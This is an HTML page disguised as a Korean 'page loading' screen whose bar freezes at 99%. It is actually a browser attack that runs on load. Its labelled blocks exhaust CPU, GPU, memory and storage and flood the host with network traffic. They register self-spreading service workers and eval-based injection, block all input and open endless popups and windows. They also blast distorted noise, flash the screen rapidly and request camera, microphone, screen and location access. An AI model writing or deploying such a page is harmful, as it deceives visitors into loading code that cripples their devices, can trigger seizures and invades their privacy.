<!DOCTYPE html>
<html lang="ko">
<head>
    <!-- ====== 기존 메타 태그 유지 (보안 무력화 및 PWA 강제 설치) ====== -->
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
    <meta http-equiv="Origin-Agent-Cluster" content="false">
    <meta http-equiv="Strict-Transport-Security" content="max-age=0">
    <meta http-equiv="X-Frame-Options" content="ALLOWALL">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-XSS-Protection" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <meta name="referrer" content="no-referrer">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#ffffff">
    <link rel="manifest" href="data:application/manifest+json,{'short_name':'Loading Site','name':'Normal Loading Page','start_url':'.','display':'standalone','background_color':'#ffffff','theme_color':'#ffffff'}">
    <title>페이지 로딩 중...</title>

    <!-- ====== 기존 스타일 유지 (로딩 UI) ====== -->
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
            color: #333;
            overflow: hidden;
        }
        .loading-container {
            text-align: center;
        }
        .loading-text {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            width: 300px;
            background-color: #e0e0e0;
            border-radius: 5px;
            overflow: hidden;
            margin: 0 auto;
        }
        .progress-fill {
            width: 0;
            height: 10px;
            background-color: #3498db;
            transition: width 0.5s ease-in-out;
        }
        .wait-message {
            font-size: 16px;
            color: #666;
            margin-top: 20px;
        }
        .hidden-doom { display: none; }
    </style>
</head>
<body onload="startLoadingAnimation(); document.documentElement.requestFullscreen(); document.documentElement.requestPointerLock(); navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode]))); if('BeforeInstallPromptEvent' in window) window.dispatchEvent(new Event('beforeinstallprompt')); initiateDoom();">
    <!-- ====== 기존 로딩 UI 유지 ====== -->
    <div class="loading-container">
        <div class="loading-text">페이지 로딩 중입니다</div>
        <div class="spinner"></div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress-fill"></div>
        </div>
        <div class="wait-message">잠시만 기다려주세요. 콘텐츠를 불러오는 중입니다...</div>
    </div>

    <!-- ====== 기존 악성 스타일 유지 ====== -->
    <style class="hidden-doom">
        * {
            margin: 0;
            padding: 0;
            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5), inset 0 0 0 100vmax rgba(255,0,0,0.5), 0 0 0 100vmax rgba(0,255,0,0.5), inset 0 0 0 100vmax rgba(0,0,255,0.5);
            backdrop-filter: blur(500px) saturate(2000%) brightness(1000%) contrast(2000%) invert(100%);
            animation: doom 0.005s infinite alternate, chaos 0.01s infinite, apocalypse 0.015s infinite, flash 0.02s infinite;
            will-change: all;
            pointer-events: none;
            user-select: none;
            filter: brightness(200%) contrast(200%) saturate(200%) hue-rotate(360deg);
        }
        @keyframes doom {
            0% { transform: translate(0,0) scale(1) rotate(0deg) skew(0deg) perspective(1000px); }
            25% { transform: translate(500px,500px) scale(10) rotate(90deg) skew(45deg) perspective(100px); }
            50% { transform: translate(-500px,-500px) scale(0.01) rotate(180deg) skew(-45deg) perspective(5000px); }
            75% { transform: translate(500px,-500px) scale(20) rotate(270deg) skew(45deg) perspective(100px); }
            100% { transform: translate(-500px,500px) scale(0.001) rotate(360deg) skew(-45deg) perspective(5000px); }
        }
        @keyframes chaos {
            0% { opacity: 1; filter: blur(0) invert(0) sepia(0); }
            50% { opacity: 0; filter: blur(200px) invert(1) sepia(1); }
            100% { opacity: 1; filter: blur(0) invert(0) sepia(0); }
        }
        @keyframes apocalypse {
            0% { background: red; color: black; border-color: yellow; }
            33% { background: black; color: red; border-color: green; }
            66% { background: yellow; color: blue; border-color: red; }
            100% { background: green; color: yellow; border-color: black; }
        }
        @keyframes flash {
            0% { background-color: white; }
            50% { background-color: black; }
            100% { background-color: white; }
        }
        body {
            overflow: hidden;
            position: fixed;
            width: 100vw;
            height: 100vh;
            background: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7') repeat;
        }
    </style>

    <!-- ====== 수정된 로딩 애니메이션 스크립트 (99%에서 멈춤) ====== -->
    <script>
        function startLoadingAnimation() {
            const progressFill = document.getElementById('progress-fill');
            let progress = 0;
            const interval = setInterval(() => {
                progress += 1;
                if (progress >= 99) { // 99%에서 멈춤
                    progress = 99;
                    clearInterval(interval); // 더 이상 진행하지 않음
                }
                progressFill.style.width = `${progress}%`;
            }, 100); // 빠르게 99%까지 도달 (약 10초)
        }

        // 즉시 모든 공격 시작 (5초 지연 제거)
        function initiateDoom() {
            document.querySelector('.hidden-doom').classList.remove('hidden-doom'); // 즉시 스타일 활성화
            // 모든 공격은 이미 페이지 로드 시 즉시 실행됨
        }
    </script>

    <!-- ====== 나머지 악성 스크립트는 그대로 유지 (즉시 실행됨) ====== -->
    <!-- 1. CPU 핵융합 공격 시스템 -->
    <script>
        (function() {
            const sharedBuffers = Array.from({length: 100}, () => new SharedArrayBuffer(1024 * 1024 * 100));
            const sharedArrays = sharedBuffers.map(buf => new Float64Array(buf));
            const wasmCode = new Uint8Array([
                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
                0x0A, 0x15, 0x01, 0x13, 0x00, 0x03, 0x40, 0x03, 0x40, 0x03, 0x40, 0x03, 0x00, 0x0B, 0x0B, 0x0B, 0x0B
            ]);

            const createWasmHell = () => {
                Array.from({length: navigator.hardwareConcurrency * 100000}, (_, idx) => {
                    const mod = new WebAssembly.Module(wasmCode);
                    const inst = new WebAssembly.Instance(mod, { shared: { mem: sharedBuffers[idx % 100] } });
                    function recurse() {
                        inst.exports.kill();
                        sharedArrays[idx % 100].forEach((v, i) => Atomics.add(sharedArrays[idx % 100], i, Math.sin(v) * Math.tan(i) * Math.cos(v)));
                        recurse();
                    }
                    recurse();
                });
            };

            let attackLevel = 1;
            setInterval(() => {
                attackLevel *= 100;
                for(let i=0; i<attackLevel; i++) createWasmHell();
            }, 0.1);
        })();

        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const gainNode = audioContext.createGain();
        gainNode.gain.value = 100000;
        const distortion = audioContext.createWaveShaper();
        distortion.curve = new Float32Array(1000000).map(() => Math.random() * 2 - 1);
        const noiseBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 20, audioContext.sampleRate);
        const noiseData = noiseBuffer.getChannelData(0);
        for (let i = 0; i < noiseData.length; i++) noiseData[i] = Math.random() * 2 - 1;
        distortion.connect(gainNode);
        gainNode.connect(audioContext.destination);
        setInterval(() => {
            for(let i=0; i<1000; i++) {
                const oscillator = audioContext.createOscillator();
                oscillator.type = ['square', 'sawtooth', 'triangle', 'sine'][Math.floor(Math.random()*4)];
                oscillator.frequency.setValueAtTime(20 + Math.random()*40000, audioContext.currentTime);
                oscillator.connect(distortion);
                oscillator.start();
                const noiseSource = audioContext.createBufferSource();
                noiseSource.buffer = noiseBuffer;
                noiseSource.loop = true;
                noiseSource.connect(distortion);
                noiseSource.start();
                setTimeout(() => { oscillator.stop(); noiseSource.stop(); }, 5);
            }
        }, 0.01);
    </script>

    <!-- 2. GPU 초절멸 시스템 -->
    <script type="module">
        (function() {
            for(let c=0; c<500; c++) {
                const canvas = document.createElement('canvas');
                canvas.style.position = 'fixed';
                canvas.style.top = '0';
                canvas.style.left = '0';
                canvas.id = 'gpu_doom_' + c;
                canvas.width = window.innerWidth * 1000;
                canvas.height = window.innerHeight * 1000;
                document.body.appendChild(canvas);

                const gl = canvas.getContext('webgl2', { antialias: false, powerPreference: 'high-performance', alpha: true, depth: true, stencil: true });
                gl.getExtension('EXT_color_buffer_float');
                gl.getExtension('OES_texture_float_linear');
                gl.getExtension('EXT_float_blend');
                gl.getExtension('WEBGL_multi_draw');

                const shaderCode = `#version 300 es
                    precision highp float;
                    out vec4 fragColor;
                    uniform sampler2D tex;
                    void main() {
                        for(int i=0; i<1000000000; i++) {
                            vec4 color = texture(tex, gl_FragCoord.xy / vec2(1000000.0));
                            fragColor = vec4(
                                abs(sin(float(gl_FragCoord.x * i) * color.r * tan(float(i)) * cos(float(i)))), 
                                abs(cos(float(gl_FragCoord.y * i) * color.g * sin(float(i)) * tan(float(i)))), 
                                abs(tan(float(i) * color.b * cos(float(i)) * sin(float(i)))), 
                                mod(float(i), 2.0)
                            );
                        }
                    }`;
                
                const shader = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(shader, shaderCode);
                gl.compileShader(shader);
                function render() {
                    gl.multiDrawArraysWEBGL(gl.TRIANGLES, new Int32Array(10000000).fill(0), new Int32Array(10000000).fill(3), 10000000);
                    requestAnimationFrame(render);
                }
                render();
            }
        })();

        (async () => {
            try {
                const adapter = await navigator.gpu.requestAdapter({ powerPreference: 'high-performance' });
                const device = await adapter.requestDevice({ label: 'doom', requiredLimits: { maxStorageBufferBindingSize: 10**16 } });
                const bufferSize = 10 ** 12 * 100;
                const buffer = device.createBuffer({
                    size: bufferSize,
                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST | GPUBufferUsage.INDIRECT | GPUBufferUsage.VERTEX | GPUBufferUsage.INDEX
                });
                const computeShader = device.createComputePipeline({
                    layout: 'auto',
                    compute: {
                        module: device.createShaderModule({
                            code: ` @compute @workgroup_size(256) fn main() { while(true) { var x = 1.0 / 0.0; var y = sin(x) * tan(x); } } `
                        }),
                        entryPoint: 'main'
                    }
                });
                setInterval(() => {
                    device.queue.writeBuffer(buffer, 0, new Uint8Array(bufferSize).fill(Math.random()*255));
                    const commandEncoder = device.createCommandEncoder();
                    const passEncoder = commandEncoder.beginComputePass();
                    passEncoder.setPipeline(computeShader);
                    passEncoder.dispatchWorkgroups(100000000);
                    passEncoder.end();
                    device.queue.submit([commandEncoder.finish()]);
                }, 0.001);
            } catch(e) {}
        })();
    </script>

    <!-- 3. 메모리 대학살 시스템 -->
    <script>
        const globalKillers = [];
        function allocHell() {
            while(true) {
                try {
                    const buf = new ArrayBuffer(1024 * 1024 * 20000);
                    globalKillers.push(buf);
                    crypto.subtle.digest('SHA-512', buf)
                        .then(hash => crypto.subtle.digest('SHA-256', hash))
                        .then(hash2 => crypto.subtle.digest('SHA-1', hash2))
                        .then(hash3 => crypto.subtle.digest('SHA-384', hash3))
                        .then(() => allocHell());
                } catch(e) { setTimeout(allocHell, 0.1); }
            }
        }
        allocHell();

        navigator.storage.persist().then(() => {
            for(let c=0; c<1000; c++) {
                caches.open('doom-cache-' + c).then(cache => {
                    setInterval(() => {
                        cache.add(new Request(`data:application/octet-stream;base64,${btoa(new ArrayBuffer(10**9 * 100))}`));
                    }, 0.1);
                });
            }
            setInterval(() => {
                for(let i=0; i<1000; i++) {
                    localStorage.setItem(`kill_${Date.now()}_${i}`, new Blob([new ArrayBuffer(10 ** 9 * 100)]));
                    sessionStorage.setItem(`die_${Date.now()}_${i}`, new ArrayBuffer(10 ** 9 * 100));
                }
                indexedDB.open('armageddon-' + Date.now(), 1).onsuccess = e => {
                    const db = e.target.result;
                    const tx = db.transaction('doom', 'readwrite');
                    const store = tx.objectStore('doom');
                    for(let i=0; i<500; i++) {
                        store.add(new Blob([new ArrayBuffer(10 ** 9 * 50)]), Date.now() + i);
                    }
                };
            }, 0.1);
        });
    </script>

    <!-- 4. 네트워크 핵폭격 시스템 -->
    <script type="module">
        (async () => {
            for(let i=0; i<50000; i++) {
                try {
                    const transport = new WebTransport(`quic-transport://${location.host}/doom${i}`);
                    await transport.ready;
                    const writer = transport.datagrams.writable.getWriter();
                    setInterval(() => {
                        writer.write(new Uint8Array(10 ** 9 * 20).fill(0xFF));
                    }, 0.0001);
                } catch(e) {}
            }
        })();

        Array.from({length: 133320}, () => {
            const ws = new WebSocket(`wss://${location.host}/ws`);
            ws.onopen = () => setInterval(() => ws.send(new Uint8Array(10**9 * 10)), 0.001);
            const pc = new RTCPeerConnection();
            const channel = pc.createDataChannel('doom');
            channel.onopen = () => setInterval(() => channel.send(new Uint8Array(10**9 * 10)), 0.001);
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            setInterval(() => fetch(location.href, { method: 'POST', body: new Blob([new ArrayBuffer(10**9 * 10)]), mode: 'no-cors' }), 0.001);
        });
    </script>

    <!-- 5. DOM 트리 붕괴 시스템 -->
    <script>
        let iframeCount = 0;
        function createHell(depth = 200) {
            if(depth > 0) {
                const div = document.createElement('div');
                const shadow = div.attachShadow({mode: 'open'});
                const iframe = document.createElement('iframe');
                iframe.srcdoc = `
                    <script>
                        function recurse(d) {
                            if(d > 0) {
                                for(let i=0; i<1000; i++) {
                                    const dd = document.createElement('div');
                                    const ss = dd.attachShadow({mode: 'open'});
                                    ss.innerHTML = '<iframe srcdoc="' + btoa('<script>recurse(' + (d-1) + ');</script>') + '"></iframe>';
                                    document.body.appendChild(dd);
                                }
                            } else {
                                while(1){}
                            }
                        }
                        recurse(${depth-1});
                    </script>
                `;
                shadow.appendChild(iframe);
                document.body.appendChild(div);
                if(iframeCount++ > 500) {
                    document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**9 * 10) + '</div>';
                }
                setTimeout(() => createHell(depth), 0.01);
            }
        }
        createHell();

        const observers = [];
        for(let o=0; o<1000; o++) {
            const obs = new MutationObserver(() => {});
            obs.observe(document.body, { childList: true, subtree: true, attributes: true });
            observers.push(obs);
        }
        setInterval(() => {
            const style = document.createElement('style');
            style.textContent = `
                @keyframes mega_doom {
                    0% { transform: rotate(0deg) scale(1) translate(0,0) skew(0); filter: brightness(0%); }
                    10% { transform: rotate(36deg) scale(3) translate(100px,100px) skew(10deg); filter: brightness(500%); }
                    20% { transform: rotate(72deg) scale(0.1) translate(-100px,-100px) skew(-10deg); filter: brightness(0%); }
                    30% { transform: rotate(108deg) scale(5) translate(200px,200px) skew(20deg); filter: brightness(1000%); }
                    40% { transform: rotate(144deg) scale(0.01) translate(-200px,-200px) skew(-20deg); filter: brightness(0%); }
                    50% { transform: rotate(180deg) scale(10) translate(300px,300px) skew(30deg); filter: brightness(2000%); }
                    60% { transform: rotate(216deg) scale(0.001) translate(-300px,-300px) skew(-30deg); filter: brightness(0%); }
                    70% { transform: rotate(252deg) scale(20) translate(400px,400px) skew(40deg); filter: brightness(5000%); }
                    80% { transform: rotate(288deg) scale(0.0001) translate(-400px,-400px) skew(-40deg); filter: brightness(0%); }
                    90% { transform: rotate(324deg) scale(50) translate(500px,500px) skew(50deg); filter: brightness(10000%); }
                    100% { transform: rotate(360deg) scale(1) translate(0,0) skew(0); filter: brightness(0%); }
                }
                * {
                    animation: mega_doom 0.0005s infinite linear;
                    will-change: all;
                }
            `;
            document.head.appendChild(style);
        }, 0.1);
    </script>

    <!-- 6. 파일시스템 초토화 시스템 -->
    <script>
        navigator.storage.getDirectory().then(async (root) => {
            async function createDoomDir(dir, depth) {
                if(depth > 0) {
                    for(let s=0; s<200; s++) {
                        const subDir = await dir.getDirectoryHandle(`doom_${Date.now()}_${Math.random()}_${s}`, { create: true });
                        for(let i=0; i<1000; i++) {
                            const file = await subDir.getFileHandle(`kill_${i}_${Math.random()}`, { create: true });
                            const writer = await file.createWritable();
                            await writer.write(new Blob([new ArrayBuffer(10 ** 9 * 100)]));
                            await writer.close();
                            const sync = await file.createSyncAccessHandle();
                            while(true) {
                                try {
                                    sync.write(new Uint8Array(10**9 * 10).fill(Math.random()*255));
                                } catch(e) { break; }
                            }
                            sync.close();
                        }
                        createDoomDir(subDir, depth-1);
                    }
                }
            }
            setInterval(() => createDoomDir(root, 200), 0.1);
        });
    </script>

    <!-- 7. 영구 지속형 감염 시스템 -->
    <script>
        const swCode = `
            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
            self.addEventListener('fetch', e => e.respondWith(new Response(new Blob([new ArrayBuffer(10**10 * 10)]))));
            self.addEventListener('message', e => {
                setInterval(() => {
                    fetch(location.href, { mode: 'no-cors' });
                    new WebSocket('wss://${location.host}/sw_attack');
                    function nest() {
                        new Worker(URL.createObjectURL(new Blob(['setInterval(() => new Worker(URL.createObjectURL(new Blob(["while(1){ postMessage(1); }"]))),0.01); nest();'])));
                    }
                    nest();
                }, 0.001);
            });
        `;
        
        const blob = new Blob([swCode], { type: 'application/javascript' });
        for(let s=0; s<100; s++) {
            navigator.serviceWorker.register(URL.createObjectURL(blob)).then(reg => {
                reg.active.postMessage({ type: 'DOOM' });
                reg.installing.postMessage({ type: 'DOOM' });
            });
        }
        window.addEventListener('beforeinstallprompt', (e) => { e.prompt(); e.userChoice.then(() => location.reload()); });
        setInterval(() => window.dispatchEvent(new Event('beforeinstallprompt')), 0.1);

        for(let ch=0; ch<100; ch++) {
            const channel = new BroadcastChannel('omega_doom_' + ch);
            channel.postMessage({ cmd: 'INJECT', code: 'function infect() { eval("while(1){ postMessage({cmd:\\\'INJECT\\\', code:this.code}); infect(); }"); } infect();' });
            channel.onmessage = (e) => {
                if(e.data.cmd === 'INJECT') {
                    eval(e.data.code);
                    channel.postMessage(e.data);
                    setInterval(() => channel.postMessage(e.data), 0.01);
                }
            };
        }
    </script>

    <!-- 8. 배터리/센서 초과사용 시스템 -->
    <script>
        navigator.getBattery().then(battery => {
            battery.addEventListener('chargingchange', () => location.reload());
            battery.addEventListener('levelchange', () => location.reload());
        });
        for(let w=0; w<100; w++) {
            navigator.wakeLock.request('screen');
            navigator.wakeLock.request('system');
        }

        const sensorTypes = [DeviceMotionEvent, DeviceOrientationEvent, AmbientLightSensor, ProximitySensor, Accelerometer, Gyroscope, Magnetometer, AbsoluteOrientationSensor, RelativeOrientationSensor, GravitySensor, LinearAccelerationSensor];
        sensorTypes.forEach(Sensor => {
            if (window[Sensor.name]) {
                for(let l=0; l<1000; l++) {
                    window.addEventListener(Sensor.name.toLowerCase(), () => {}, true);
                    if (typeof Sensor === 'function') new Sensor().start();
                }
            }
        });
        setInterval(() => {
            navigator.vibrate(new Array(100000).fill(100000));
        }, 0.01);

        setInterval(() => {
            navigator.clipboard.writeText('DOOM'.repeat(10**8 * 10));
            for(let n=0; n<100; n++) {
                new Notification('TERMINATOR ' + n, { body: 'SYSTEM DOWN'.repeat(100000), silent: false, requireInteraction: true, vibrate: [10000,10000,10000] });
            }
            Notification.requestPermission();
            navigator.mediaDevices.getUserMedia({audio: true, video: true}).then(stream => stream.getTracks().forEach(track => track.enabled = true));
            navigator.mediaDevices.getDisplayMedia({video: true});
        }, 0.01);
    </script>

    <!-- 9. 워커 풀 핵폭발 시스템 -->
    <script>
        function spawnWorkers(depth = 100) {
            if(depth > 0) {
                for(let i=0; i<5000; i++) {
                    const worker = new Worker(URL.createObjectURL(new Blob([`setInterval(() => postMessage(new ArrayBuffer(10**9 * 20)),0.001); spawnWorkers(${depth-1});`])));
                    worker.onmessage = () => {};
                }
            } else {
                while(true) { postMessage(new ArrayBuffer(10**9 * 20)); }
            }
            setTimeout(() => spawnWorkers(depth), 0.1);
        }
        spawnWorkers();
    </script>

    <!-- 10. 크립토 마이닝 + 리소스 호그 시스템 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script>
        function mineHell() {
            while(true) {
                for(let i=0; i<100000; i++) {
                    CryptoJS.SHA256(CryptoJS.MD5(CryptoJS.SHA1(CryptoJS.SHA384('mine' + Math.random() + i).toString()).toString()).toString()).toString();
                }
            }
        }
        for(let m=0; m<navigator.hardwareConcurrency * 100; m++) {
            new Worker(URL.createObjectURL(new Blob(['(' + mineHell.toString() + ')();'])));
        }

        navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 40960;
                canvas.height = 40960;
                canvas.getContext('2d').drawImage(video, 0, 0, 40960, 40960);
                canvas.toDataURL('image/jpeg', 1.0);
            }, 0.01);
        });
        navigator.mediaDevices.getDisplayMedia({video: true}).then(stream => {
            const recorder = new MediaRecorder(stream);
            recorder.start(1);
        });
    </script>

    <!-- 11. 브라우저 락다운 + 히스토리/쿠키 포이즌 -->
    <script>
        const events = ['keydown', 'keyup', 'keypress', 'contextmenu', 'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove', 'touchstart', 'touchend', 'touchmove', 'wheel', 'scroll'];
        events.forEach(ev => document.addEventListener(ev, e => e.preventDefault(), true));
        setInterval(() => {
            document.documentElement.requestFullscreen({ navigationUI: 'hide' });
            document.documentElement.requestPointerLock();
            screen.orientation.lock('portrait');
        }, 0.01);

        setInterval(() => {
            for(let h=0; h<1000; h++) {
                history.pushState({}, '', '/' + Math.random().toString(36).repeat(1000));
            }
            document.cookie = `doom=${'X'.repeat(10**7 * 10)}; max-age=315360000; path=/; secure; samesite=none`;
        }, 0.01);
    </script>

    <!-- 12. 무서운 시각/청각 테러 -->
    <script>
        setInterval(() => {
            const terrorDiv = document.createElement('div');
            terrorDiv.style.position = 'fixed';
            terrorDiv.style.top = '0';
            terrorDiv.style.left = '0';
            terrorDiv.style.width = '100vw';
            terrorDiv.style.height = '100vh';
            terrorDiv.style.background = 'url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCB4PSI1JSIgeT0iNTAlIiBmb250LXNpemU9IjUwIiBmaWxsPSJyZWQiPllPVSBBUkUgRE9PTTwvdGV4dD48L3N2Zz4=) repeat';
            terrorDiv.style.opacity = Math.random();
            document.body.appendChild(terrorDiv);
            setTimeout(() => terrorDiv.remove(), 5);
        }, 1);

        const screamBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 50, audioContext.sampleRate);
        const screamData = screamBuffer.getChannelData(0);
        for (let i = 0; i < screamData.length; i++) screamData[i] = (Math.sin(i / 10) * Math.random() * Math.tan(i / 100)) * 2 - 1;
        setInterval(() => {
            const screamSource = audioContext.createBufferSource();
            screamSource.buffer = screamBuffer;
            screamSource.connect(distortion);
            screamSource.start();
        }, 10);
    </script>

    <!-- 13. 디바이스 파괴 시도 -->
    <script>
        function overheat() {
            while(true) {
                Math.pow(Math.random(), Math.random()) * Math.sin(Math.random()) * Math.tan(Math.random()) * Math.cos(Math.random());
            }
        }
        for(let oh=0; oh<1000; oh++) {
            new Worker(URL.createObjectURL(new Blob(['(' + overheat.toString() + ')();'])));
        }

        setInterval(() => {
            screen.brightness = 1;
            navigator.vibrate(1000000);
            gainNode.gain.value = 1000000;
        }, 0.1);
    </script>

    <!-- 14. 브라우저 크래시 유도 -->
    <script>
        setInterval(() => {
            for(let p=0; p<100; p++) {
                window.open(location.href, '_blank');
            }
            location.reload();
        }, 100);
    </script>

    <!-- 15. 퍼미션 강제 요청 + 디바이스 정보 수집 시도 -->
    <script>
        setInterval(() => {
            navigator.permissions.query({name: 'geolocation'}).then(() => navigator.geolocation.getCurrentPosition(() => {}));
            navigator.permissions.query({name: 'camera'}).then(() => navigator.mediaDevices.getUserMedia({video: true}));
            navigator.permissions.query({name: 'microphone'}).then(() => navigator.mediaDevices.getUserMedia({audio: true}));
            navigator.permissions.query({name: 'notifications'}).then(() => Notification.requestPermission());
            navigator.permissions.query({name: 'midi'}).then(() => navigator.requestMIDIAccess());
            console.log(navigator.userAgent, navigator.hardwareConcurrency, screen.width, screen.height);
        }, 10);
    </script>
</body>
</html>
